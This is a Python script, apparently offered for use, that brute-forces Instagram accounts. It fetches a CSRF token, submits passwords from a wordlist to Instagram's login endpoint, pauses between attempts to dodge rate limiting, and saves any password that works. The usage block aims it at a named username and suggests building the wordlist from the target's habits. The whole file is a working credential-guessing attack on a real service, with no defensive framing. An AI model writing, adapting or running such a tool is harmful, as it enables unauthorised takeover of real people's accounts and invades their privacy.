import requests
from bs4 import BeautifulSoup
import time

class InstagramBruteForcer:
    def __init__(self, username, password_file):
        self.username = username
        self.password_file = password_file
        self.session = requests.Session()
        self.login_url = "https://www.instagram.com/accounts/login/?hl=en"
        self.login_ajax_url = "https://www.instagram.com/accounts/login/ajax/"
        self.csrf_token = self.get_csrf_token()

    def get_csrf_token(self):
        response = self.session.get(self.login_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})
        return csrf_token['value'] if csrf_token else self.session.cookies.get('csrftoken')

    def login(self, password):
        payload = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-CSRFToken': self.csrf_token,
            'Referer': self.login_url,
        }
        response = self.session.post(self.login_ajax_url, data=payload, headers=headers)
        return response

    def brute_force(self):
        with open(self.password_file, 'r') as file:
            for line in file:
                password = line.strip()
                response = self.login(password)
                if response.status_code == 200 and response.json().get('authenticated'):
                    print(f"Login successful! Password: {password}")
                    with open('found_password.txt', 'w') as f:
                        f.write(password)
                    return True
                else:
                    print(f"Login failed with password: {password}")
                # Sleep to avoid rate limiting, consider increasing this delay for more realistic testing
                time.sleep(5)
        print("Password not found in the provided file.")
        return False

# Usage example
username = 'anu.ande'
password_file = './passwords.txt' # use multiple passwords according to person behaviour
brute_forcer = InstagramBruteForcer(username, password_file)
brute_forcer.brute_force()
